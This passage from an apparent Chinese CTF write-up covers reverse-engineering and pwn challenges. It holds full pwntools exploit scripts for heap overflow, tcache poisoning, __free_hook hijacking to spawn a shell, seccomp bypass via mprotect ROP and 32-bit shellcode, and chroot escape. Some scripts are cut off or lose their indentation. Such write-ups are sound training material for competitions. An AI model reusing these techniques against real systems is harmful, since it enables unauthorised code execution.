	op_mov, <span class="hljs-number">0x10D</span>, op_eax, <span class="hljs-number">-0x1a</span>,  op_edx,		<span class="hljs-comment">//5 mov byte ptr ss:[ebp+eax-0x1A],dl</span>
	op_jmp,	<span class="hljs-number">-73</span>,								<span class="hljs-comment">//2 jmp short Project2.00C61092</span>
	op_xor, op_eax, op_eax,						<span class="hljs-comment">//3 xor eax,eax</span>
	op_pop, op_edi,								<span class="hljs-comment">//2 pop edi</span>
	op_pop, op_esi,								<span class="hljs-comment">//2 pop esi</span>
&#125;;</code></pre>

<p>其中寄存器标识就是指代需要使用的寄存器，唯一需要注意的只有在处理mov指令时，还需要根据后一位的标志符来进行判断处理，这里就不再赘述。<br>以上的汇编代码其实是完全按照一段简单的加密翻译的，其实算法本身完全没有难度</p>
<pre><code class="hljs c++"> 
unit8 szBuffer[] = <span class="hljs-string">&quot;flag&#123;w31c0m325wpuc7f@havea9o0d71m3&#125;&quot;</span>;
unit8 out[<span class="hljs-number">36</span>];
<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;
<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">36</span>; ++i)
&#123;
	<span class="hljs-keyword">if</span> (i % <span class="hljs-number">2</span>)
	&#123;
		out[i] = (szBuffer[i] + JI) ^ (<span class="hljs-number">0x68</span> - i);
	&#125;
	<span class="hljs-keyword">else</span>
	&#123;
		out[i] = (szBuffer[i] - OU) ^ (<span class="hljs-number">0x67</span> + i);
	&#125;
&#125;
<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">18</span>; ++i)
&#123;
	out[i] ^= (i + <span class="hljs-number">0x32</span>);
	out[i + <span class="hljs-number">18</span>] ^= (i + <span class="hljs-number">0x23</span>);
</code></pre>

<p>所以我们甚至可以找到模拟的栈中存放我们输入的位置，并找到加密后的存放位置观察其变化，也能进行解析。<br>至于输入的位置其实可以看见就是利用了lea/rep movs两条指令，所以不管你输入多少，都会取出36位进行加密，只要找到这里，紧跟在后续的位置就是存放加密后的位置。</p>
<h2 id="Re-exe"><a href="#Re-exe" class="headerlink" title="Re.exe"></a>Re.exe</h2><p>这道题的思想是 A * B = C</p>
<p>A矩阵可逆，B矩阵是由输入的18个字符低4bit,高4bit位构成6*6的矩阵。</p>
<p>验证1：字符串长度，验证2：B矩阵的和，验证3: A*B是否等于C</p>
<p>已知AC,求B</p>
<p>B = A的逆矩阵*C</p>
<p>然后再根据B矩阵拼接回去，即可得到flag.</p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="shellco"><a href="#shellco" class="headerlink" title="shellco"></a>shellco</h2><p>在输入name后，如果name的长度等于8，将获得一次输入的机会，此次输入存在溢出，可以修改之后的对话次数，在栈的最顶上存放着一个地址，该地址为对话循环的跳转位置，多次对话将不停向栈上压入对话内容，直到覆盖栈的顶部，修改跳转位置为shellcode。</p>
<p>由于所有被保存的输入都不超过8个字节，且输入后都会再向栈上压入内容，所以shellcode本身不能超过8个字节。shellcode编写思路：在程序开始时，r12寄存器保存了“/bin/sh”的地址，跳转前会执行rax，rbx，rcx，rdx的清零，故shellcode为”mov rbx,r12;mov al,11;int 0x80”</p>
<p>wp</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*
context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)
p=process(<span class="hljs-string">&quot;./1&quot;</span>)
<span class="hljs-comment">#p=remote(&quot;49.235.209.57&quot;,10000)</span>
sleep(<span class="hljs-number">0.1</span>)
p.send(<span class="hljs-string">&quot;\xff&quot;</span>*<span class="hljs-number">8</span>)
sleep(<span class="hljs-number">0.1</span>)
p.send(<span class="hljs-string">&quot;\xff&quot;</span>*<span class="hljs-number">40</span>+<span class="hljs-string">&quot;\x18&quot;</span>)
sleep(<span class="hljs-number">0.1</span>)
a=<span class="hljs-number">16</span>
<span class="hljs-comment">#pay=&quot;\x4c\x89\xe3\xb0\x0b\xcd\x80&quot;</span>
pay=asm(<span class="hljs-string">&quot;&quot;&quot;</span>
<span class="hljs-string">mov rbx,r12;</span>
<span class="hljs-string">mov al,11;</span>
<span class="hljs-string">int 0x80</span>
<span class="hljs-string">&quot;&quot;&quot;</span>)
<span class="hljs-keyword">print</span> len(pay)
sleep(<span class="hljs-number">0.1</span>)
p.send(pay)
<span class="hljs-keyword">while</span>(a):
	sleep(<span class="hljs-number">0.1</span>)
	a=a<span class="hljs-number">-1</span>
	p.sendafter(<span class="hljs-string">&quot;you lost&quot;</span>,<span class="hljs-string">&quot;\x89\x05\x60\x00\x00\x00\x00\x00&quot;</span>)
	p.recv()
p.interactive()</code></pre>

<h2 id="tnote"><a href="#tnote" class="headerlink" title="tnote"></a>tnote</h2><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span>
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span>
binary = <span class="hljs-string">&quot;./tnote&quot;</span>
ip = <span class="hljs-string">&quot;47.98.229.132&quot;</span>
port = <span class="hljs-number">10000</span>
elf = ELF(binary)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>(<span class="hljs-params">ip, port, debug</span>):</span>
    <span class="hljs-keyword">if</span> debug == <span class="hljs-number">1</span>:
        sh = process(binary)
        lib = elf.libc
        <span class="hljs-comment"># lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)	</span>
    <span class="hljs-keyword">else</span>:
        sh = remote(ip, port)
        lib = ELF(<span class="hljs-string">&quot;libc-2.27.so&quot;</span>)	
        <span class="hljs-comment"># lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span>
    s       = <span class="hljs-keyword">lambda</span> data               :sh.send(str(data))
    sa      = <span class="hljs-keyword">lambda</span> delim,data         :sh.sendafter(str(delim), str(data))
    sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(str(data))
    sla     = <span class="hljs-keyword">lambda</span> delim,data         :sh.sendlineafter(str(delim), str(data))
    r       = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :sh.recv(numb,timeout=<span class="hljs-number">5</span>)
    ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :sh.recvuntil(delims, drop,timeout=<span class="hljs-number">5</span>)
    irt     = <span class="hljs-keyword">lambda</span>                    :sh.interactive()
    uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
    uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
    lg      = <span class="hljs-keyword">lambda</span> data               :log.success(data)
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span>
        sla(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;A&quot;</span>);
        sla(<span class="hljs-string">&quot;?&quot;</span>,str(size));
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span>
        sla(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;D&quot;</span>);
        sla(<span class="hljs-string">&quot;?&quot;</span>,str(idx))
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span>
        sla(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;E&quot;</span>)
        sla(<span class="hljs-string">&quot;?&quot;</span>,str(idx))
        sa(<span class="hljs-string">&quot;:&quot;</span>,content)
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span>
        sla(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;S&quot;</span>)
        sla(<span class="hljs-string">&quot;?&quot;</span>,str(idx))
    add(<span class="hljs-number">0x18</span>)
    add(<span class="hljs-number">0x18</span>)
    add(<span class="hljs-number">0x58</span>)
    add(<span class="hljs-number">0x18</span>)
    add(<span class="hljs-number">0x78</span>)
    payload = <span class="hljs-string">&quot;\x11&quot;</span> * <span class="hljs-number">0x18</span> + p8(<span class="hljs-number">0x81</span>)
    edit(<span class="hljs-number">0</span>,payload)
    free(<span class="hljs-number">1</span>)
    add(<span class="hljs-number">0x78</span>)
    free(<span class="hljs-number">4</span>)
    payload = <span class="hljs-string">&quot;\x11&quot;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x81</span>) + <span class="hljs-string">&quot;\n&quot;</span>
    edit(<span class="hljs-number">1</span>,payload)
    free(<span class="hljs-number">2</span>)
    payload = <span class="hljs-string">&quot;\x11&quot;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>) + <span class="hljs-string">&quot;\n&quot;</span>
    edit(<span class="hljs-number">1</span>,payload)
    show(<span class="hljs-number">1</span>)
    ru(<span class="hljs-string">&quot;\x11&quot;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0xdeadbeefdeadbeef</span>))
    heap_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x320</span>
    payload = <span class="hljs-string">&quot;\x11&quot;</span> * <span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x81</span>)
    payload += p64(heap_base + <span class="hljs-number">0x10</span>) + <span class="hljs-string">&quot;\n&quot;</span>
    edit(<span class="hljs-number">1</span>,payload)
    add(<span class="hljs-number">0x78</span>)
    add(<span class="hljs-number">0x78</span>)
    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x0f0f0f0f0f0f0f0f</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">9</span> + p64(heap_base + <span class="hljs-number">0x10</span>) + <span class="hljs-string">&quot;\n&quot;</span>
    edit(<span class="hljs-number">4</span>,payload)
    free(<span class="hljs-number">4</span>)
    add(<span class="hljs-number">0x78</span>)
    show(<span class="hljs-number">4</span>)
    ru(<span class="hljs-string">&quot;content:&quot;</span>)
    main_arena = uu64(r(<span class="hljs-number">6</span>))
    success(<span class="hljs-string">&quot;main_arena = &quot;</span>+hex(main_arena))
    libc = main_arena - lib.symbols[<span class="hljs-string">b&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">96</span> - <span class="hljs-number">0x10</span>
    success(<span class="hljs-string">&quot;libc = &quot;</span>+hex(libc))
    lib.address = libc
    system = lib.symbols[<span class="hljs-string">b&#x27;system&#x27;</span>]
    __free_hook = lib.symbols[<span class="hljs-string">b&#x27;__free_hook&#x27;</span>]
    success(<span class="hljs-string">&quot;libc_base = &quot;</span>+hex(libc))
    success(<span class="hljs-string">&quot;sys_addr = &quot;</span>+hex(system))
    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x0f0f0f0f0f0f0f0f</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">9</span> + p64(__free_hook - <span class="hljs-number">8</span>) + <span class="hljs-string">&quot;\n&quot;</span>
    edit(<span class="hljs-number">4</span>,payload)
    add(<span class="hljs-number">0x78</span>)
    edit(<span class="hljs-number">5</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + p64(system) + <span class="hljs-string">&quot;\n&quot;</span>)
    free(<span class="hljs-number">5</span>)
    irt()

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
	pwn(ip, port, <span class="hljs-number">0</span>)</code></pre>

<h2 id="corporate-slave"><a href="#corporate-slave" class="headerlink" title="corporate_slave"></a><strong>corporate_slave</strong></h2><p>1）本题为glibc2.27保护全开</p>
<p>2）题目逻辑比较简单，只有一个add功能，并且漏洞点很明显off by X(null)，通过readSize的索引来往地址中写一个0字节</p>
<p>3）难点在于如何利用，我们知道当我们malloc一个大的堆块（0x200000）时就会使用mmap来分配堆块，此时堆地址紧挨libc,因此我们可以利用这一点来往libc范围内写0字节，那该往哪里写呢</p>
<p>4）我们首先需要泄露libc，通过源码我们可以知道要想泄露数据需要完成的流程是：puts-&gt;_IO_file_xsputn-&gt;_IO_file_overflow-&gt;_IO_new_do_write-&gt;_IO_SYSWRITE (fp, data, to_do);通过条件判定我们需要满足以下条件fp-&gt;_flags &amp;~ 0x1000 &amp;&amp; fp-&gt;_IO_read_end  = fp-&gt;_IO_write_base,由于0xfbad2887 &amp; 0x1000已经满足了条件，因此只需要让 fp-&gt;_IO_read_end  = fp-&gt;_IO_write_base即可进入_IO_SYSWRITE (fp, fp-&gt;_IO_write_base,fp-&gt;_IO_write_base-fp-&gt;_IO_write_ptr ),从而泄露libc，那泄露libc之后呢？</p>
<p><img src="https://images-cdn.shimo.im/4Wrb3Z8dPllRHzK1__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>5）我们第三次写0字节考虑往stdin里面写，将fp-&gt;_IO_buf_base的最后一字节写为0,此时io_buf_base恰好指向io_file的头部，因此我们可以伪造整个io_file，那如何getshell呢？</p>
<p><img src="https://images-cdn.shimo.im/GLzFOo2JkxgRPsk4__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>6）我们采用二重写入的方法来将另一部分的io_file写入到stdout，从而当puts的时候通过io_str_overflow来获取shell，那如何二重写入，我们研究一下stdin的源码可以知道，程序在写入之后会回调到_IO_getline，而_IO_getline里面判断了fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr是否小于0若小于0则调用__uflow,因此我们需要让fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr小于0，在__uflow里面又调用了_IO_default_uflow而此函数调用了_IO_file_underflow，这里就达成了我们二次写入的条件，我们知道第一次只能读0x84的数据因此剩下我们发送的就会通过_IO_SYSREAD (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);向fp-&gt;_IO_buf_base写入，此时fp-&gt;_IO_buf_base已经被我们修改为了stdout的头部，因此可以实现二次写入，我们布置好stdout结构体的值使其走向io_str_overflow通过以下源码getshell</p>
<p><img src="https://images-cdn.shimo.im/kUMenw2JTgtqU5bK__thumbnail.png" srcset="/img/loading.gif" alt="图片"></p>
<p>最后获取flag</p>
<h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>1.  漏洞点利用了abs()函数本身存在的漏洞缺陷，当输入的是0x80000000的时候，会导致整数溢出，进而导致堆溢出。</p>
<p>2.  考察了加解密知识，对于输入输出进行了DES_CBC加解密转换，需要掌握des_CBC加解密方法才能正常获取输入输出。</p>
<p>3.  设置了seccomp限制了system execve函数的利用，也就是说劫持got表的方式不可用，并且禁用了open函数，对于seccomp函数理解不深刻pwn手来说，便以为不能利用open read wirte 的shellcode来读取shellcode了。但其实我只是禁用了64位的open函数，32位的open函数仍可以利用，因此我们写32位的shellcode利用open read write来读取flag。</p>
<p>4.  具体方式就是劫持stack,利用rop链执行mprotect函数赋予执行权限，然后跳转到shellcode执行shellcode。</p>
<pre><code class="hljs python"><span class="hljs-keyword">from</span> PwnContext <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> sys
reload(sys)
sys.setdefaultencoding(<span class="hljs-string">&#x27;utf-8&#x27;</span>)
<span class="hljs-keyword">from</span> pyDes <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> binascii <span class="hljs-keyword">import</span> b2a_hex, a2b_hex
<span class="hljs-keyword">try</span>:
<span class="hljs-keyword">from</span> IPython <span class="hljs-keyword">import</span> embed <span class="hljs-keyword">as</span> ipy
<span class="hljs-keyword">except</span> ImportError:
<span class="hljs-keyword">print</span> (<span class="hljs-string">&#x27;IPython not installed.&#x27;</span>)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-h&#x27;</span>]
context.log_level = <span class="hljs-string">&#x27;info&#x27;</span>
<span class="hljs-comment"># functions for quick script</span>
s       = <span class="hljs-keyword">lambda</span> data               :ctx.send(str(data))        <span class="hljs-comment">#in case that data is an int</span>
sa      = <span class="hljs-keyword">lambda</span> delim,data         :ctx.sendafter(str(delim), str(data))
sl      = <span class="hljs-keyword">lambda</span> data               :ctx.sendline(str(data))
sla     = <span class="hljs-keyword">lambda</span> delim,data         :ctx.sendlineafter(str(delim), str(data))
r       = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :ctx.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :ctx.recvuntil(delims, drop)
irt     = <span class="hljs-keyword">lambda</span>                    :ctx.interactive()
rs      = <span class="hljs-keyword">lambda</span> *args, **kwargs    :ctx.start(*args, **kwargs)
dbg     = <span class="hljs-keyword">lambda</span> gs=<span class="hljs-string">&#x27;&#x27;</span>, **kwargs    :ctx.debug(gdbscript=gs, **kwargs)
<span class="hljs-comment"># misc functions</span>
uu32    = <span class="hljs-keyword">lambda</span> data   :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))
uu64    = <span class="hljs-keyword">lambda</span> data   :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))
ctx.binary = <span class="hljs-string">&#x27;./pwn&#x27;</span>
ctx.remote = (<span class="hljs-string">&quot;62.234.32.102&quot;</span>, <span class="hljs-number">10000</span>)
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size</span>):</span>
sla(<span class="hljs-string">&#x27;ice&#x27;</span>,<span class="hljs-number">0</span>)
sla(<span class="hljs-string">&#x27;where would you like to put&#x27;</span>,idx)
sla(<span class="hljs-string">&#x27;how long do your want to input&#x27;</span>,size)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span>
sla(<span class="hljs-string">&#x27;ice&#x27;</span>,<span class="hljs-number">1</span>)
sla(<span class="hljs-string">&#x27;which one do you want to delete&#x27;</span>,idx)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span>
sla(<span class="hljs-string">&#x27;ice&#x27;</span>,<span class="hljs-number">2</span>)
sla(<span class="hljs-string">&#x27;which one do you want to show&#x27;</span>,idx)
ru(<span class="hljs-string">&#x27;is :\n&#x27;</span>)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span>
sla(<span class="hljs-string">&#x27;ice&#x27;</span>,<span class="hljs-number">3</span>)
sla(<span class="hljs-string">&#x27;which one do you want to change&#x27;</span>,idx)
sa(<span class="hljs-string">&#x27;now you can change your diary&#x27;</span>,content)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span>(<span class="hljs-params">idx,content</span>):</span>
sla(<span class="hljs-string">&#x27;ice&#x27;</span>,<span class="hljs-number">4</span>)
sa(<span class="hljs-string">&#x27;index&#x27;</span>,idx)
sa(<span class="hljs-string">&#x27;IV&#x27;</span>,content)

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_shellcode</span>():</span>
ascii = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">&#x27;shellcode&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:
data = f.readlines()
data = data[<span class="hljs-number">0</span>]
data = str(data)[<span class="hljs-number">1</span>:<span class="hljs-number">-2</span>]
odom = data.split(<span class="hljs-string">&#x27;,&#x27;</span>)
ascii = map(int,odom)
<span class="hljs-comment">#return ascii</span>
x86_shellcode = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(ascii)):
x86_shellcode += chr(ascii[i])
<span class="hljs-keyword">return</span> x86_shellcode
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypto_data</span>(<span class="hljs-params">data</span>):</span>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">&#x27;cipher&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:
f.write(data)
payload = <span class="hljs-string">&#x27;./cbc &#x27;</span>
os.system(payload)
sleep(<span class="hljs-number">1</span>)
cleartext = <span class="hljs-string">&quot;&quot;</span>
<span class="hljs-keyword">with</span> open(<span class="hljs-string">&#x27;plain&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:
cleartext = f.read(<span class="hljs-number">8</span>)
<span class="hljs-keyword">return</span> cleartext
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">lg</span>(<span class="hljs-params">s,addr</span>):</span>
print(<span class="hljs-string">&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;</span>%(s,addr))

rs(<span class="hljs-string">&#x27;remote&#x27;</span>)
KEY = <span class="hljs-string">&quot;\0\0\0\0\0\0\0\0&quot;</span>
IV = <span class="hljs-string">&quot;\0\0\0\0\0\0\0\0&quot;</span>
k = des(KEY, CBC, IV, pad=<span class="hljs-literal">None</span>, padmode=PAD_PKCS5)

ru(<span class="hljs-string">&#x27;gift :&#x27;</span>)
heap_leak = int(r(<span class="hljs-number">4</span>),<span class="hljs-number">16</span>)

<span class="hljs-comment">#leak libc</span>
add(<span class="hljs-number">0</span>,<span class="hljs-number">0x38</span>)
add(<span class="hljs-number">1</span>,<span class="hljs-number">0x38</span>)
add(<span class="hljs-number">2</span>,<span class="hljs-number">0x38</span>)
add(<span class="hljs-number">3</span>,<span class="hljs-number">0x38</span>)
add(<span class="hljs-number">4</span>,<span class="hljs-number">0x38</span>)
add(<span class="hljs-number">15</span>,<span class="hljs-number">0x38</span>)
change(<span class="hljs-number">0x80000000</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>+chr(heap_leak+<span class="hljs-number">1</span>)+<span class="hljs-string">&#x27;\n&#x27;</span>)
edit(<span class="hljs-number">15</span>,p64(<span class="hljs-number">0xc1</span>)*<span class="hljs-number">2</span>+<span class="hljs-string">&#x27;\n&#x27;</span>)
delete(<span class="hljs-number">0</span>)
add(<span class="hljs-number">5</span>,<span class="hljs-number">0x38</span>)
show(<span class="hljs-number">1</span>)
data = decrypto_data(r(<span class="hljs-number">8</span>))
libc = uu64(data[:<span class="hljs-number">6</span>])
<span class="hljs-comment">#print hexdump(data)</span>
libc_base = libc - <span class="hljs-number">0x3c4be8</span>
<span class="hljs-comment">#dbg()</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;libc_base = &#x27;</span> + hex(libc_base)
<span class="hljs-comment">#leak stack</span>
environ = libc_base + <span class="hljs-number">0x3c6f38</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;environ = &#x27;</span> + hex(environ)
change(<span class="hljs-number">0x80000000</span>,p64(environ)+<span class="hljs-string">&#x27;\n&#x27;</span>)
<span class="hljs-comment">#dbg()</span>
show(<span class="hljs-number">15</span>)
data = decrypto_data(r(<span class="hljs-number">8</span>))
stack = uu64(data[:<span class="hljs-number">6</span>])
main_ret = stack - <span class="hljs-number">0xf0</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;main_ret : &#x27;</span> + hex(main_ret)
libc_leak_heap = libc_base + <span class="hljs-number">0x3c4b80</span>

<span class="hljs-comment">#leak heap</span>
change(<span class="hljs-number">0x80000000</span>,p64(libc_leak_heap)+<span class="hljs-string">&#x27;\n&#x27;</span>)
<span class="hljs-comment">#dbg()</span>
show(<span class="hljs-number">15</span>)
data = decrypto_data(r(<span class="hljs-number">8</span>))
heap_base = uu64(data[:<span class="hljs-number">4</span>]) - <span class="hljs-number">0x140</span>

<span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;heap_base : &#x27;</span> + hex(heap_base)
lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)
<span class="hljs-comment">#raw_input()</span>

<span class="hljs-comment">#get shell</span>
<span class="hljs-comment">#dbg()</span>
edit(<span class="hljs-number">4</span>,<span class="hljs-string">&#x27;./flag/asdad/wer/po/tr/flag\n&#x27;</span>)
<span class="hljs-comment"># edit(4, &#x27;./flag.txt\n&#x27;)</span>
payload = <span class="hljs-string">&#x27;python shellcode.py &#x27;</span>+str(heap_base)
os.system(payload)
shellcode = read_shellcode()
pop_rdx = libc_base + <span class="hljs-number">0x1b92</span>
pop_rsi = libc_base + <span class="hljs-number">0x202f8</span>
pop_rdi = <span class="hljs-number">0x021112</span> + libc_base
mprotect = <span class="hljs-number">0x101830</span> + libc_base
change(<span class="hljs-number">0x80000000</span>,p64(main_ret)+<span class="hljs-string">&#x27;\n&#x27;</span>)
payload = p64(pop_rdi) + p64(heap_base) + p64(pop_rsi)  + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx) + p64(<span class="hljs-number">7</span>) + p64(mprotect)
edit(<span class="hljs-number">15</span>,payload)
change(<span class="hljs-number">0x80000000</span>,p64(main_ret+<span class="hljs-number">0x38</span>)+<span class="hljs-string">&#x27;\n&#x27;</span>)
edit(<span class="hljs-number">15</span>,p64(heap_base+<span class="hljs-number">0x150</span>)+<span class="hljs-string">&#x27;\n&#x27;</span>)
<span class="hljs-comment">#dbg()</span>
edit(<span class="hljs-number">1</span>,shellcode[:<span class="hljs-number">0x20</span>]+<span class="hljs-string">&#x27;\n&#x27;</span>)
change(<span class="hljs-number">0x80000000</span>,p64(heap_base+<span class="hljs-number">0x170</span>)+<span class="hljs-string">&#x27;\n&#x27;</span>)
<span class="hljs-comment">#dbg()</span>
edit(<span class="hljs-number">15</span>,shellcode[<span class="hljs-number">0x20</span>:]+<span class="hljs-string">&#x27;\n&#x27;</span>)
<span class="hljs-comment">#dbg()</span>
sla(<span class="hljs-string">&#x27;ice&#x27;</span>,<span class="hljs-number">5</span>)
irt()</code></pre>

<p>还有一个点是flag的位置，如果直接执行cat flag拿到的是假flag，需要自己探测flag目录。<br>shellcode，DES_CBC加解密，查找flag的脚本【也可以手动】就不放了 自己尝试。</p>
<h2 id="jailbreak"><a href="#jailbreak" class="headerlink" title="jailbreak"></a><strong>jailbreak</strong></h2><p>通过off by one实现tcache attack，修改money。从而获得dup的fd，通过劫持tcache结构体（中间可能需要修复tcache_num），劫持__free_hook为setcontext，执行chdir(fd)来实现chroot逃逸。</p>
<pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span>
<span class="hljs-keyword">import</span> sys
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-comment">#log_level[&#x27;CRITICAL&#x27;, &#x27;DEBUG&#x27;, &#x27;ERROR&#x27;, &#x27;INFO&#x27;, &#x27;NOTSET&#x27;, &#x27;WARN&#x27;, &#x27;WARNING&#x27;]</span>
context.log_level = <span class="hljs-string">b&quot;CRITICAL&quot;</span>
remote_ip        = <span class="hljs-string">b&#x27;127.0.0.1&#x27;</span>
remote_port      = <span class="hljs-number">9999</span>
binary_file      = <span class="hljs-string">&#x27;./%s&#x27;</span> % <span class="hljs-string">&quot;jailbreak&quot;</span>
<span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span>
local_libc_file  = <span class="hljs-string">b&#x27;./libc-2.27.so&#x27;</span>
remote_libc_file = <span class="hljs-string">b&#x27;&#x27;</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exploit</span>(<span class="hljs-params">sh,remote = False,awd = False,awd_binary_file = <span class="hljs-string">&#x27;&#x27;</span></span>):</span>
<span class="hljs-keyword">global</span> binary_file,local_libc_file,remote_ip,remote_port,local_libc_file,remote_libc_file
elf = context.binary
<span class="hljs-keyword">if</span> (awd <span class="hljs-keyword">or</span> remote) <span class="hljs-keyword">and</span> remote_libc_file != <span class="hljs-string">&quot;&quot;</span>:
lib = ELF(remote_libc_file)
<span class="hljs-keyword">else</span>:
lib = elf.libc <span class="hljs-keyword">if</span> local_libc_file == <span class="hljs-string">b&quot;&quot;</span> <span class="hljs-keyword">else</span> ELF(local_libc_file)
s       = <span class="hljs-keyword">lambda</span> data               :sh.send(str(data))
sa      = <span class="hljs-keyword">lambda</span> delim,data         :sh.sendafter(str(delim), str(data))
sl      = <span class="hljs-keyword">lambda</span> data               :sh.sendline(str(data))
sla     = <span class="hljs-keyword">lambda</span> delim,data         :sh.sendlineafter(str(delim), str(data))
r       = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :sh.recv(numb)
ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :sh.recvuntil(delims, drop)
irt     = <span class="hljs-keyword">lambda</span>                    :sh.interactive()
uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))
